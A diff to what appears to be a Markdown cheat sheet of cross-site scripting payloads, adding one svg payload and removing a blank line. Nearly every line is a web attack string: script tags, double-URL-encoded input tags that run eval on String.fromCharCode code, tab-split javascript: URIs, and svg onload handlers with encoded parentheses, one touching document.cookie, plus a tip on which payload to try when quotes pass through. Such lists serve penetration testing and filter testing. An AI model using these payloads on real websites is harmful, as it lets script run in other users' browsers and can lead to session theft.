@@ -11,7 +11,6 @@
 10203040;𝐩𝐡𝐨𝐧𝐞-𝐜𝐨𝐧𝐭𝐞𝐱𝐭=<𝐬𝐜𝐫𝐢𝐩𝐭>𝐚𝐥𝐞𝐫𝐭(1)</𝐬𝐜𝐫𝐢𝐩𝐭>
 "><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
-
 returnuri=%09Jav%09ascript:alert(document.domain)
 var onskeywords = 'hello';onload=prompt(0);
 '};alert('XSS');var x={y:'
@@ -121,6 +120,7 @@ OnMoUsEoVeR=prompt(/hacked/)//
 <svg onload=alert%26%230000000040"1")
 <svg onload=prompt%26%230000000040document.domain)>
 <svg onload=prompt%26%23x000000028;document.domain)>
+<svg onx=() onload​=(confirm) (document.cookie)>
 ```
 
 ## When you find input field which allows " (quotes), try this payload:
